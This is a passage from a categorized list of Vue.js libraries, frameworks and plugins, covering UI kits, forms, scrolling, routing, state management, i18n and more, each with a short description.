universal responsive UI component library\nN3-components - Beautiful Web Components built with Vue 2\nShards Vue - \u2728 Sleek & UI Components Library based on the Bootstrap 4 Framework.\nFundamental Vue - Components based on SAP Fiori Fundamentals.\nFramevuerk - \ud83d\ude80 Fast, Responsive, Without Dependencies, Both Direction Support and Configurable UI Framework based on Vue.js.\n@Carbon/vue - Carbon Design System components from the @carbon team.\nNutUI - A Vue.js 2.0 UI Toolkit for Mobile Web\n\nMobile\nUI frameworks for mobile\n\nFramework7-Vue - Build full featured iOS & Android apps using Framework7 & Vue.\nvux - [Chinese] Vue UI Components based on WeUI.\nvue-onsenui - Mobile app development framework and SDK using HTML5 and JavaScript. Create beautiful and performant cross-platform mobile apps. Based on Web Components, and provides bindings for Angular 1, 2, React and Vue.js.\nWeex - Weex provides the ability to publish cross platform, so web, Android, and IOS apps can use the same API development functions.\nweex-eros - [Chinese] Eros is a app solution based on Weex and Vue, which enables you to use API of Vue, simple and quick development of small and medium app.\n\nSet of components for mobile\n\nmint-ui - Mobile UI elements for Vue.js.\nvant - A Vue.js 2.0 Mobile UI From YouZan.\ncube-ui - A fantastic mobile ui lib implement by Vue.js 2.\nmand-mobile - A mobile UI toolkit, based on Vue.js 2, designed for financial scenes.\n\nComponent Collections\nSet of components without layout system\n\nvue-mdc - Material Components Web for Vue.js.\nkeen-ui - A lightweight collection of essential UI components written with Vue and inspired by Material Design.\nvue-admin - Vue Admin Panel Framework, Powered by Vue 2.0 and Bulma 0.3.\nvuikit - UIkit with all the power of Vue.\nuiv Bootstrap3 components implemented by Vue2.\nwffranco/vue-strap - Bootstrap 3 components built with Vue.js 2\njsmod-vue-pc - Highly scalable web components for vue 2.0\nguilhermewaess/SemVue - Semantic-ui Modules implemented with Vue 2\noffice-ui-fabric-vue - Office UI Fabric implementation for Vue.js\nvuestic-admin - Vue Admin Dashboard with collection of custom components. Built with Vue 2 and Bootstrap 4\nSemantic UI Vue - Semantic UI integration for Vue\nvuesax - Frontend vue Components for Vue.js.\nEssential JS 2 for Vue - Full featured 45+ Vue.js components which includes Data Grid, Chart, Scheduler and Diagram components etc.\nBanshee - A mostly renderless Vue UI component and utility framework that ships with no CSS.\nvue-atlas - A library of beautiful Vue components.\nDevExtreme Vue Components - 65+ responsive and feature-complete Vue UI components with customizable Material Design and Bootstrap compliant themes.\njqwidgets - 70+ Vue.js 2.0 UI Components with Material Design themes.\nvue-uix - UI collection for web page implementation in Vue.js\nvuedarkmode - A Minimalist Dark Design System for Vue.js \ud83c\udfa8\nKendo UI for Vue \u2013 Over 70 UI components, including a Grid, built for business applications. Fully responsive with support for several Design Languages including Material Design and Bootstrap.\nVuent - Vue.js components implementing Microsoft Fluent Design\nbpit/vue - Vue components lib which is focused on effects\n\nAdmin Template\nSet of admin template\n\niView Vue Admin - iView Vue Admin / An admin portal template based on iView 2.x\nelement Vue Admin - element Vue Admin / An admin portal template based on Element UI 2.x\nvue-element-admin - A magical vue admin based on Element UI 2.x\nD2 Admin - An elegant backstage template build by vue Online Demo\nrest-admin - Restful Admin Panel Based on Vue and Bootstrap 4 Online Demo\nShards Dashboard Lite Vue - \u2728 Modern admin template featuring dozens of custom components and templates.\nVue Material Admin - A vue material design admin template\nelement-admin - A dead simple but powerful vue admin with Vue CLI 3 and element-ui.\n\nServer-side rendering\n\nNuxt.js - Versatile Vue.js Framework.\nReam - A minimalistic framework for building server-rendered and static websites.\nUniversal vue - Vue CLI plugin to create universal Vue applications with ease\n\nStatic website generator\n\nVuePress - Minimalistic Vue-powered static site generator.\nPeco - A static website generator for humans.\nGridsome - Build super fast, modern websites with Vue.js\n\nOther\n\napp-framework - IOS and Android Apps with HTML & JavaScript - develop, build and deploy - free and open source.\nMyfirebase - A decoupled Single page application Framework which is highly compatible with google firebase.\nVue-Access-Control Frontend access control framework based Vue.js 2.\nBasys Toolbox for building full-stack Vue.js apps\n\nUI Utilities\nEvent Handling\nHandling of user events (scroll, click, key strike, ...)\n\nvue-shortkey - Vue-ShortKey - plugin for Vue.js.\nvue-throttle-event - Throttle events based on requestAnimationFrame.\nvue-waypoint - Waypoint component for Vue, this is the easiest way to trigger a function when you scroll.\nvue-clickaway - Reusable clickaway directive for reusable Vue.js components.\nvue-scrollfire - Fires an event on a specific scroll position.\nvue-resize-directive - Vue directive to detect resize events with deboucing and throttling capacity.\nv-click-outside - Vue directive to react on clicks outside of an element without stopping the event propagation.\nvue-outside-events - Vue 2.x directive to help a specified element listen for specific events occurring outside of itself.\nvue-selectable - Vue 1.x/2.x directive to make items selectable by mouse.\nvue-click-helper - Vue2.x directive to handle click event and dblclick event on same element.\nv-hotkey - Vue 2.x directive for binding hotkeys to components.\nvue-resize - Vue 2.x component to detect DOM elements resizing (event based/no window.onresize)\nvue-observe-visibility - Vue 2.x directive using Intersection Observer API that detects if the element is visible (in the viewport and not hidden by CSS).\nv-dragged - Vue 2.x directive plugin for drag event detection.\nvue-esc - Vue.js directive to add a document event listener on escape keyup.\nvue-global-events \u2013 A component to handle global events (like shortcuts) using Vue\u2019s event modifiers\nvue-edge-check \u2013 Check browser edge to prevent transition effect triggered oddly when swipe edge with vue-router\nvue-mutation-observer \u2013 A simple and tiny directive to observe changes in DOM use MutationObserver API\nvue-scroll-show \u2013 Showing the element if the user reached it after scroll\nvue-tabevents \u2013 Easy communication between other opened tabs\n\nResponsive Design\n\nvue-viewports - Define your custom viewports and use them in your components.\nvue-responsive: Vue.js(2.x) directive to hide/show HTML-elements with the Bootstrap 4, 3 or self defined breakpoints.\nvue-match-media - Vue 2.x-compatible plugin that offers a consistent, semantic approach to making components media query-aware.\nvue-media-query-mixin - Vue 2 media query mixin that can be used in both component js and component template. Compatible with bootstrap and vuetify viewports. wXS returns if screen width is xs, wSM returns true if screen width is sm, etc...\nvue-breakpoints - Vue 2 minimal components to show and hide elements based on breakpoints. Inspired by Airbnb.\nvue-mq - Offer some useful tools to quickly setup responsive design with a semantic and mobile-first API (Vue 2.x)\nVueResizeSensor - A container that supports resize event.\nvue-breakpoint-component - A render-less component for\ncomposing CSS breakpoint state.\nfine-mq - A fine API to manage media queries in JS with ease and first-class integration with VueJS as a plugin.\nvue-responsive-components - Create responsive components with ResizeObserver.\nvue-screen-size - Get easy and reactive access to the width and height of your screen.\n\nForm\n\nvue-formly - JavaScript powered forms for Vue.js.\nvue-focus - A reusable focus directive for reusable Vue.js components.\nvue-form-generator - A schema-based form generator component for Vue.js.\nFormSchema Native - Generate a form using JSON Schema and Vue.js\nic-formly - Simple form component powered by vue-formly.\nForm Builder - Json template based form builder, based on Vue and Laravel.\nvue-autofocus-directive - Vue autofocus directive.\nvue-awesome-form - A vue.js component just like json-editor\nvue-form-components - Clean & minimal vue form elements with validation\nncform - a very nice configuration generation way to develop form\n\nValidation\n\nvee-validate - Simple Vue.js input validation plugin.\nvue-rawmodel - RawModel.js plugin for Vue.js v2. Form validation has never been easier.\nvuelidate - Simple, lightweight model-based validation for Vue.js.\nsimple-vue-validator - A simple yet flexible validator library for vue.js.\nvue-vform - Vue.js 2 form component that integrates jQuery Validation and Axios.\nvue-form - Comprehensive form validation for Vue.js.\nvuelidation - simple, powerful, vuejs validation.\nlaravel-vue-validator - Display errors from laravel validation rules\nvue-daval - Super vue data validator. Easiness, simplicity, accurate.\nwillvalidate - Validation Forms for Vue.js.\nvue-m-validator - Model data validation library, for VueJs.\nvue-isyourpasswordsafe - A small utility written in Vue that checks if the given password has been leaked against the Have I Been Pwned API.\nvue-form-send - A Vue.js directive for sending data from form and primitive validation\nFormVuelar - Vue form components with server side validation in mind\nvue-final-validate - Vue validation solution from my development experience, support nested, async.\n\nResize\n\nvue-not-visible - Vue directive for removing from dom (like v-if) element on screen smaller than breakpoints.\nvue-window-size - Provides reactivity window size properties.\nvue-responsive-text - \u2194 Component that scales its child node in relation to its parent node's width\n\nScroll\nSet window scroll position\n\nvue-chat-scroll - Automatic scroll-to-bottom directive for Vue.js 2.0.\nvue-scrollto - Adds a directive that listens for click events and scrolls to elements.\nvue-next-level-scroll - A component based and SSR ready approach to smooth scrolling using the modern Scroll behavior API\nvue-scroll-sync - A component that synchronizes containers\u2019 scroll positions\nv-scroll-lock - A Vue.js directive for body scroll locking without breaking scrolling of a target element\nvue2-perfect-scrollbar - PerfectScrollbar minimalistic wrapper\nvue-scroll-to - Adds a directive that listens for click events and scrolls to elements.\nvue-scroll-progressbar - A customizable component that indicates the scroll relative position in a progressbar.\n\nVirtual scrollbar\n\nVBar - The virtual responsive cross-browser scrollbar component for Vue.js 2x.\nVuebar - Vue 2 directive for custom scrollbar that uses native scroll behavior. Lightweight, performant, customizable and without dependencies.\nvue-detached-scrollbar - A simple scrollbar that can be detached from the container it is scrolling.\nvuescroll - A scrolling plugin based on Vue.js for uniforming the scrolling in PC and mobile.\nvue-simplebar - Vue.js wrapper for simplebar plugin.\n\nDetect when components enter viewport\n\nvue-scrollview - A component utilizing scoped slots to detect when a vue component enters and leaves the viewport.\nvue-scrollactive - Adds an active class in a menu item based on the current section in viewport, also scrolling to the section when clicking the menu item.\nvue-intersect - A Vue component to add intersection-observer to a Vue component or HTML element.\nvue-scrollmonitor - A Vue plugin to watch visibility state of elements inside viewport with a wide range of browsers supported (use provide/inject so compat vue@2.2.x)\nvue-stroll - An Awesome CSS3 list scroll effects component for Vue.js 2.x.\nnavscroll-js - Highlights menu items as you scroll, and also scrolls to a section when a menu item clicked. Use as a vue component, a vue directive or with vanilla js.\nvue-scrollwatch - A light plugin detecting scroll event,customize callback when element enter viewport,expose 'scrollTo' api to scroll to specific  element .Using vue directive.\nvue-check-view - A plugin that checks if element is in viewport. Fast, small, has no dependencies, live demo.\nvue-stickto - A vue directive that support multiple DOM nodes stick to top automatically\nvue2-scrollspy - A scrollspy plugin and animated scroll-to.\n\nCustomize the scroll behavior\n\nvue-scroll-behavior - Customize the scroll behavior on route navigation. Especially hash mode.\nvue-scroll-stop - Stops propagation scroll when edge reached.\n\nSeamless scrolling\n\nvue-seamless-scroll - A simple, Seamless scrolling for Vue.js.\n\nRouting\n\nvue-router - The official router for Vue.js.\nvue-router-storage - Router storage & resolve solution for Vue.js 2 & vue-router 2\nvue-tidyroutes - Decentralized vue-router routes definitions\nvue-routisan - Elegant route definitions for Vue Router based on Laravel routing system\nvue-error-page - Provides a wrapper for router-view that allows you to show error pages without changing the URL\nvue-router-sitemap - Generate sitemap.xml by vue-router configuration\nvue-smart-route - Smart route directive to make intelligent looking apps with Vue.js.\n\nLazy Load\n\nvue-lazyload - A Vue.js plugin for lazyload your Image or Component in your application.\nvue-lazy-background-images - Lazy load background images for Vue 2.\nvue-progressive-image - Vue progressive image loading plugin.\nvue-l-lazyload - A lazyload plugin for Vue.js v2.x+.\nvue-lazyload-img - Especially optimized for mobile browser. support V2 & v1.\nvue-lazy-images - A plugin of lazyload images for Vue 2.x.\nv-lazy-img - Tiny (<0.6kb) directive for progressive image loading for Vue 2.\nvue-clazy-load - Lightweight transitionable image lazy loading component using IntersecionObserver for Vue 2.\nvue-lazy-this - Lazyloading component using Intersection Observer API.\nv2-lazy-list - A simple lazy-load list component based Vue 2.x\npimg - A Simple Progressive Image Component used for lazy loading images.\nvue-tiny-lazyload-img - A small size Vue.js v.2+ directive for lazy loading images\nvue-lazy-youtube-video - A simple Vue.js component for lazy loading YouTube videos.\nlazyload-vue- Vue Plugin for vanilla-lazyload.\n\nPagination\n\nvue-paginate - A simple vue.js plugin to paginate data.\nvue-pagination-2 - Vue.js 2 pagination component.\nvuejs-uib-pagination - Best and complete pagination plugin for Vue.js. Inspired in Angular Bootstrap Pagination.\nvuejs-paginate - A Vue.js(v2.x+) component for creating pagination.\nvue-pagination-bootstrap - A Vue.js (1.x & 2.x) server-side paging component with a template based on Bootstrap\nlaravel-vue-semantic-ui-pagination - A Vue.js 2.x pagination used with Laravel & Semantic-UI.\nvue-paginate-al - Vue paginate with return your data.\nvue-tiny-pagination - A Vue component for create a tiny pagination.\nlaravel-vue-pagination - A Vue.js pagination component for Laravel paginators that works with Bootstrap.\nvue-lpage - Low-level Vue pagination component.\nv-page - A simple pagination bar, including length Menu, i18n support, based on Vue2.x.\nvue-smart-pagination - Smart pagination of any data with a lot of nice settings.\nvue-paginatron - Pagination component built with scoped-slot props for maximum flexibility.\nvue-ads-pagination - A vue pagination component build with the css framework tailwindcss\n\nAnimation\n\nvue2-animate - A Vue.js 2.0 port of Animate.css. For use with Vue's built-in transitions.\nanimated-vue - A Vue.js 2.x plugin to easily use Animate.css animations as transitions. As easy as <animated-tada>!\nvue-lottie - A Vue.js 2.x plugin to render after effects animations based on bodymovin\nVueg - Make vue-router have a transition effect / \u4e3a webApp \u63d0\u4f9b\u8f6c\u573a\u7279\u6548\u7684\u5f00\u6e90 Vue \u63d2\u4ef6\nv-animate-css - The easiest to implement Vue 2 directive for Animate.css\nvue-mixin-tween - Mixin factory that adds tweened values to component context for animations\nv-odometer - Smoothly transitions numbers with ease. Use this library to give your application a smooth animation, only applicable on numbers.\nvue2-transitions \u2728 Reusable Vue 2 transition components\nvue-overdrive Super easy magic-move transitions for Vue apps \ud83c\udfa9\nanimated-number-vue Super easy way to animate numbers.\nvue-typed-js Typed.js integration to easily create typying animations.\nvue-parent-change-transition Enable a child components to animate when it changes the parent.\nvue-smooth-reflow Transition an elements reflow in response to data changes.\nVueTween Allows components to tween their properties.\nvue-slide-up-down Like jQuery's slideUp / slideDown, but for Vue!\nvue-animejs Simple anime.js directives for Vue.\nEagle.js Eagle.js is a web-based slideshow framework for Vue.js.\nvue-pose Pose for Vue is a declarative motion system that combines the simplicity of CSS transitions with the power and flexibility of JavaScript.\nvue-slide-up-down-component It is a simple interface but realizes very flexible and powerful slide animation, for Vue!\nfemtoTween A minimalistic (zero-dep, less than 1k) tweening library with first-class Vue support\nvue-sequential-entrance Plugin for creating elegant sequential animation entrances with a list of elements of your page. Zero effort. Simple and lightweight\nvue-animate-scroll Super lightweight way to add CSS animations to elements as they scroll into view.\nvue-svg-transition Create 2-state, SVG-powered transitions\n\nMeta Tags\nManage meta information in the document head\n\nvue-head - Manage the meta information of the head tag, a simple and easy way.\nvue-meta - Manage page meta info in Vue 2.0 components. SSR + Streaming supported.\nvue-headful - Set document <title> and meta tags from within your views.\nvue-simple-headful - Easily set meta-tags with vue.js - a simpler vue-headful alternative with TypeScript support.\n\nPortal\nMove a DOM node to a target DOM node\n\nvue-dom-portal - An escape hatch for DOM Elements in Vue.js components.\nportal-vue - A Vue Plugin to render your component's template anywhere in the DOM (Works on the virtualDOM level, doesn't move nodes within the DOM)\n\nFilters\n\nvue2-filters - A collection of standard filters Vue 1.* adapted for use in Vue 2.*.\nvue-morphling - A collection of standard and custom filters for Vue 2.\nvue-currency-filter - Lightweight and Customizeable Vue 2 Currency Filter.\nvue-trans - A simple filter to provide a similar way of translating to the Symfony trans.\nvue-string-filter - Lightweight Vue 2 String Manipulation Filter.\nvue-units - A collection of handy unit conversion filters for use in Vue 2.\nvue-numeral-filter - A collection of filters that allows Numeral.js to be used inline in the template section of a component.\nvue-filter-date-format - Simple datetime filter for Vue 2.\nvue-filter-pluralize - Simple pluralize filter for Vue 2.\nvue-filter-date-parse - Simple parsing datetime filter for Vue 2.\n\nSVG\n\nvue-svgicon - A tool to create svg icon components. (vue 2.x).\nvue-content-loading - Vue component to easily build (or use presets) SVG loading cards Facebook like.\nvue-annotator - Annotate page using any SVG Element (rect, polygon, and many more, even HTML Element like canvas if wrapped in foreignObject)\nvue-svg-sprite - A directive to simply use SVG sprite (vue 2.x).\nvue-svg-filler - Vue component for custom your svg file \ud83d\udd8d \ud83c\udfa8 (vue 2.x).\n\nMiscellaneous\n\nvue-resource-progressbar-interceptor - Interceptor that ties a progressbar to all requests, that it is clear that something is loading.\nvue-images-loaded - Vue.js 2.0 directive to detect images loading.\nvue-visible - A v-visible directive for VueJS (2.x), like v-show but for visibility.\nvue-resize-sensor - Component to detect container resizing (event-based)\nv-blur - Vue directive to blur an element dynamically\nvue-async-methods - Helper utilities for promise based methods\nvue-openseadragon - OpenSeaDragon component for Vue.js (zoom and pan)\nvue-match-heights - Directive to set heights of elements to be the same.\nvue-conditional-attrs - A Vue.js component for conditional rendering attributes and directives\nvue-cbsc - A Vue.js 2.x component for programmatically blender, shader and convert colors.\nvue-spatialnavigation - Vue directive (Vue.js 2.x) for spatial navigation (keyboard navigation)\nvue-lifecycle - A Vue.js lifecycle directives.\nvue-aspect-ratio - Aspect ratio directive for vue.\n\nWebGL\n\nvue-3d-model - A 3D model viewer in Vue component.\nvue-pano - A panorama viewer in Vue component.\nvue-threejs - Vue bindings for Three.js.\nVueGL - Vue.js components rendering 3D graphics reactively via three.js\nvue-vr - A framework for building VR applications with Vue\nbased on threejs and Panolens, inspired by react-vr\nvue-displacement-slideshow - A Vue.js component that makes Webgl image displacement transitions easier.\n\nFullscreen\n\nvue-fullscreen - A simple Vue component for fullscreen.\n\nPage visibility\n\nvue-page-visibility-awesome - A Vue 2.x component of easy-to-config page visibility api.\nvue-authplugin - an elegant view auth control plugin, support directive and prototype methods.\n\nPrinting\n\nvue-html-to-paper - Vue mixin for paper printing html elements to paper.\n\nUtilities\nUtilities not directly related to the UI\n\nvue-underscore - simple vue plugin to implement underscore\nvue-lazy-calc - A simple calculation plugin in lazy && chaining way with strong typed.\n\nTypescript\n\nvue-typed - Sets of ECMAScript / Typescript decorators that helps you write Vue component easily.\nvue-typescript - Typescript decorators to make vue feel more typescripty.\nvue-property-decorator - Vue.js and Property Decorator.\nvue-typescript-component - Decorators to use TypeScript classes as Vue.js 2.0 components.\nvue-typescript-import-dts - TypeScript declaration file that allows using 'import' with .vue files.\nvue-ts-loader - Type-check your script in your vue-loader.\nvue-mixin-decorator - Typescript decorator for strongly typed Mixins.\nvue-ts-component-generator - A simple cli tool for generating vue typescript components.\nvue-local-storage-decorator - Persist data by using local stoarge in decorator format\nvuex-module-decorators - Typescript/ES7 Decorators to make Vuex modules a breeze\nvuex-class-modules - Introduce a simple type-safe class style syntax for your vuex modules, inspired by vue-class-component.\n\nHTTP Requests\nRetrieve data over HTTP\n\nvue-resource - The HTTP client for Vue.js.\nvue-async-computed - Async computed properties for Vue.js.\nvue-jsonp - A tiny library for handling JSONP request.\nv-model - V-Model is a model plugin for Vue.js, like ng-resource.\nvue-resource-mock - A helper to mock your http response, based on vue-resource's interceptor.\nvue-async-data-2 - Async data loading plugin for Vue.js.\nvue-api-request - A plugin that provides full control on your APIs, making your request simple, fast and easy to implement.\nvue-fast-axios - Make requests with validations in a simple and beautiful way.\nvue-async-properties - An asyncData and asyncComputed plugin with support for debouncing, transforming results, error handlers, loading/pending flags, lazy/eager requests.\nvue-axios-plugin - A plugin that combines axios with Vuejs, making http request more easier.\nvuex-api - A vuex plugin for effortlessly handle api calls.\nzipkin-instrumentation-vue-resource - An interceptor for vue-resource that instruments outgoing HTTP requests with Zipkin\nvue-api-query - Elegant and simple way to build requests for REST API.\nvue-chimera - A full-featured RESTful resource based client, compatible with Nuxt.js and allows server side fetch.\nvue-google-api - A wrapper for easy integration of the Google's APIs client in any vue.js 2 project, based on promises, with built-in Oauth2 \"Sign In with Google\" facilities.\nvue-apis - A vue plug-in integrated with axios that chain-builds API instances. Available from the context of a vue instance (eg: this.$apis.apiName()).\n\ni18n\nInternationalization / L10n / localization / translation\n\nvue-i18n - Internationalization plugin for Vue.js.\nvue-translate-plugin - VueJS plugin for translations.\nvuex-i18n - Localization plugin for vue.js 2.0 using vuex as store.\nvue-gettext - Translate your Vue.js applications with gettext.\nvue-i18n - A small plugin for implementing translations in Vue.js.\nvue-multilanguage - Support many languages in Vue.js 2.\nvue-ts-locale - A plugin for implementing translations using Intl in Vue.js 2 with typescript support.\nvue-i18next - A i18next wrapper to support translations in Vue.js 2.\nvue-polyglot - Basic translation plugin for Vue.js 2 with async loading.\nv-localize - Simple localization plugin for\nthe amazing Vue.js.\nvue-simple-i18n - Probably the thinnest library to end all Vue i18n solutions within 1kb\ntemplate-string-i18n - I18n using template strings with auto save/load translate documents.\nvue-translations - Translate your vuejs application easy with it.\nvue-i18n-service -  Export and import @kazupon/vue-i18n's SFC translations simply using npx vue-i18n-service export|import.\nvue-i18n-filter -  Vue filter extend for Vue-i18n, simply using {{ hello world | t }}.\nvue-translation-manager - Interactively find and translate strings in your Vue.js application. Works well with vue-18n and vuex-i18n.\nvue-t9n - Simplest way to translate your applications\nvue-simple-inline-translation - A Vue component that simplifies the way text is translated: by translating it inline.\nvue-i18n-extract - Manage vue-i18n localization with static analysis. Make reports about missing and unused i18n entries.\n\nCustom Events\n\nvue-events - Simple event handling for Vue.js.\nvue-event-handler - Event handling plugin for VueJS.\nvue-event-manager - The global event manager for Vue.js.\nvue-geb - A global event bus using Observables.\nvue-bus - Tiny simple central event bus plugin for Vue.js 2.\nvue-simple-events - Yet another event management plugin, but WITHOUT Vue instance\nvue-option-events - Bring Vue.js 1 events option and $emit to Vue.js 2.\n\nPersistence\nLocalStorage etc.\n\nvue-localstorage - Vue.js localStorage plugin with types support.\nvue-ls - Vue plugin for work with LocalStorage from Vue context.\nvue-pouch - Live and reactive bindings for PouchDB. Persist data in IndexedDB and sync with CouchDB.\nvue-idb - Lists and huge lists management with IndexedDB (Dexie.js) only or automatically created and extendible vuex modules\nvuejs-storage - Vue.js and vuex plugin to persistence data with localStorage/sessionStorage.\nvue-browserstore - Browser storage wrapper.\nVueStorage - Allows components to save and load their data across browser sessions.\nvue-web-storage Another Vue.js plugin for localStorage and sessionStorage\nvue-universal-cookies Isomorphic cookies plugin for Vue.js / Nuxt.js supports Browser, Express, http (node).\nvue2-storage Browser storage for Vue.js app\nvue-warehouse A Cross-browser storage for Vue.js and Nuxt.js, with plugins support and easy extensibility based on Store.js.\nvue-storage-watcher - A reactive localStorage/sessionStorage plugin for Vue.js with strong typed.\n\nState Management\n\nvuex - Centralized State Management for Vue.js.\nvue-sync - Synchronize Vue State with the Browser URL, Server Backend, and other endpoints.\nvuelm - Lightweight state management inspired by Elm architecture.\nvuez - A simple but powerful State Management for Vue.js, with only 2 APIs.\nvuet - Vue.js state management model for Agile Development\nvue-ya-stash - Yet Another stash storage with update/patch event emitters simillar with v-bind.sync\nvue-assign-model - Automatically assign elements value to model for Vue.js.\nvue-stash - Easily share reactive data between your Vue components.\nvue-mc - Models and Collections for Vue.js\nvue-model - Model component for Vue.js\ntuex - A mostly reasonable alternative to Vuex.\nrevuejs - A tiny, light and handy state management for vuejs 2, writing less verbose code.\nlue - Vue and vuex based library, writing less verbose code.\nvuex-lite - A 1KB Vuex with just state and mutations.\nVuenut - is a component to develop faster and more fluently.\nvue-shared - A light and simple alternative to vuex\nvuex-module-generator - It allows you to create a vuex module easily.\nvuex-declaration - Declare state like props, make state inject to vuex dynamically when component created.\n\nRedux\n\nvuedeux - Binding Solutions for Vue & Redux.\n\nredux-store-mixin - Mixin for integrate action creators in methods of vue-component\nvue-redux-prepare-props - Helper for use props of Redux with Vue.js using Vuex and Vuedeux\n\n\nvuejs-redux - High order component facilities for Vue and Redux.\n\nMobx\n\nmovue - Mobx integration for Vue.js.\nvue-mobx - Mobx binding for Vuejs 2.x.\n\nAuthentication/Authorization\n\nvue-kindergarten\nvue-authenticate - Simple Vue.js authentication library for login/register and OAuth (1.0/2.0) authentication\nvue-facebook-account-kit - Simple vue wrapper to the fb account kit library.\ncasl-vue - Restricts what resources a given user is allowed to access\nvue-google-api - A wrapper for easy integration of the Google's APIs client in any vue.js 2 project, based on promises, with built-in Oauth2 \"Sign In with Google\" facilities.\nvue-auth - A simple light-weight authentication library for Vue.js\nvue-auth-plugin - A simple authentication and authorization library for Vue.js using typescript\n\nVuex Utilities\n\nvuex-persistedstate - Persist Vuex state with localStorage.\nvuex-plugin-jsdata - A plugin for syncing Vuex store with js-data.\nvuex-local - Local state management within Vuex.\nvuex-action - Utilities for vuex to easily create and manage actions.\nvuex-rest-api - A Helper utility to simplify the usage of REST APIs with Vuex. Based on axios.\nvuex-cache - A Vuex plugin utility to cache action those will make remote request.\nvuex-persist - A Typescript-ready Vuex plugin to help save the store to localStorage or any custom Storage (that you can configure).\nvuex-local-state - Add 'localState/sessionState' options to vuex. Keep the Vuex state with localStorage.\nvuex-cli-scaffold - Scaffold vuex actions, mutations, getters and the state.\nvuex-action-reload - A vuex plugin that reloads actions when a condition is met.\nvuejs-storage - Vue.js and vuex plugin to persistence data with localStorage/sessionStorage.\nvuex-orm - The Vuex plugin to enable Object-Relational Mapping access to the Vuex Store.\nvuex-async-module - Reduce async boilerplate code generating Vuex modules. Compatible with Vue 2.x.\nvuex-api - A vuex plugin for effortlessly handle api calls.\nvuex-queries - Vuex-Queries helps you write query functions in Vuex\nvuex-microservice - Define microservice URLs at a dedicated place and use them inside your Vuex actions.\nvuex-iframe-sync - Vuex state synchronization between iframe/window.\nvuex-aspect - Bind remote data of any kind to the vuex store.\nVuenut - is a component to develop faster and more fluently.\nvuex-map-fields - Enable two-way data binding for form fields.\nvuex-search - Vuex binding for client-side search with indexers and Web Workers.\nvuex-dry - helps keep your vuex codes DRY.\nvuex-pathify - provides a unified path syntax to Vuex stores (such as foo/bar@a.b.c)\nvuex-loading - Simplify vuex loading state management\nvuex-module-builder - Vuex module builder is a wrapper for writing vuex stores efficiently with some common methods built-in.\nvuex-pagination - Easily work with paginated resources in your Vue/Vuex application. Works well with most of the Vue pagination components.\nvuex-easy-firestore - Easy coupling of Firebase Cloud Firestore and Vuex. 2-way sync with 0 boilerplate!\nvuex-listener - A global Vuex action and mutation listener plugin\njsonapi-vuex - Use a JSONAPI api with a Vuex store, with client-side restructuring/normalization of records.\n\nSync Between Tabs\n\nvuex-basement - Vuex state persistence and synchronization between tabs/windows.\nvuex-shared-mutations - Share vuex mutations between tabs/windows.\n\nGraphQL\n\nvue-apollo - Apollo/GraphQL integration for VueJS.\nvue-relay - A framework for building GraphQL-driven Vue.js applications.\nvuex-orm-apollo - Apollo/GraphQL integration for Vuex-ORM.\n\nConcurrency Management\n\nvuency - Concurrency management for Vue.js.\n\nCode Style\nImprove readability of code\n\nvue-types - Vue Prop Types definitions.\nvue-factory - A simple factory/provider extension for Vue.js, like services in Angular.\neslint-plugin-vue - Eslint plugin for Vue.js projects.\nvue-decorators - Decorators for Vue.js (beta).\nvue-computed-helpers - Computed helpers for Vue.js apps\nvert - Library to build Vue applications in OOP.\nvue-slot-checker - Provide the function to check slot like checking props.\n\nCSS\n\nvue-bem-cn - Simple BEM class name generator for Vue.JS.\nvue-css - Vue.js plugin that allows you to bundle CSS with your components.\nvue-mods-names - Adding modificators to class names for all components in app.\nvue-styler - Simple, performant styler for vue.\nvue-css-modules - Seamless mapping of class names to CSS Modules inside of Vue components.\nvue-simple-bem - Directive with succint syntax for adding BEM class names to elements.\nfela-vue - CSS-IN-JS mixin for Vue designed for flexibility yet team-oriented.\nj-vue\n\nAsset Management\nUtilities for building / compiling / bundling / loading assets\n\nvue-script2 - Standardized, designer-friendly script tag behavior for your Single Page App.\nvue-loader - Webpack loader for Vue.js components.\nvueify - Browserify transform for single-file Vue components.\nvue-compiler - A simple cli wrapper around the vue-component-compiler.\nvue-brunch - Adds support to Brunch for pre-compiling single file Vue components.\npoi - Start writing an app with a single .js file, Poi could handle all the development setups for you, no more configuration hell.\nhttp-vue-loader - Load .vue files directly from your html/js without node.js environment nor build step.\nvue-jsx-hot-loader - Enable HMR for Vue.js components with JSX render functions.\nVueInBrowserLoader - Loads a .vue file from the given URL and compiles it to a component directly in the browser.\nvue-separate-files-webpack-loader - Webpack loader for separated Vue components parts\nvue-svg-loader - webpack loader that lets you use SVG files as Vue components\n\nPage Navigation\n\nvue-navigation - A page navigation library, record routes and cache pages, like native app navigation. \u4e00\u4e2a\u9875\u9762\u5bfc\u822a\u5e93\uff0c\u8bb0\u5f55\u8def\u7531\u5e76\u7f13\u5b58\u9875\u9762\uff0c\u50cf\u539f\u751fAPP\u5bfc\u822a\u4e00\u6837\u3002\nvue-acl - Access Control List for VueJS 2.\nvue-breadcrumbs - Implements simple breadcrumb functionality with vue-router for both Vue 1.x and Vue 2.x.\nvue-2-breadcrumbs - breadcrumb together with vue-router for Vue 2.x. and Bootstrap 4\nvs-crumbs - Vue breadcrumbs in 40 lines of code that allows nested paths without child views.\nvue-nav - Page navigation manager, support all navigation function of native mobile app. \u9875\u9762\u5bfc\u822a\u7ba1\u7406\u5668\uff0c\u652f\u6301\u624b\u673a\u539f\u751f\u5e94\u7528\u7684\u6240\u6709\u5bfc\u822a\u529f\u80fd\u3002\nvue-2-crumbs - Breadcrumbs plugin for Vue.js 2 framework that allows to select parent route in route meta object with no need of sub-routing. Also allows using dynamic data.\nvue-pesdk Vue.js wrapper for the PhotoEditorSDK\nvue-resolve\nResolve routes data before entering / rendering the component for that route.\n\nMiscellaneous\n\nvue-container - A simple dependency injection library for Vue 2.\nvue-super - A simple plugin to call methods on parent components.\n@skyrpex/props-to-local - Vue mixin that maps props to local data.\nvue-inject - Dependency injection for Vue 2.x Components\nvue-deepset - Interact with deeply nested fields in Vue/Vuex objects/state with v-model in Vue 1.x and 2.x\nvue-gaspard - DOM helpers plugin for Vue.js\nvue-configuration - A static configuration object for Vue.js\nvue-lodash - A simple wrapper for integrating lodash to Vue 2.\nvue-ramda - Vue Wrapper for ramda\nvue-router-user-roles - Protects routes based on user roles. Add your own authentication.\nvue-messenger - A series of useful enhancements to Vue component props: Transform, Enum-type, Numeric-type, Two-way data bindings.\nvue-uuid-v4 - Plugin Vue2 to easy get UUIDv4\nvue-async-operations - Managing async operations statuses in your Vue components\nvue-direction - \ud83d\udc4b Direction aware hover in Vuejs\nvue-unique-id - Generates unique component ids and component-scoped HTML ids.\n\nWeb Workers\n\nvue-worker - A 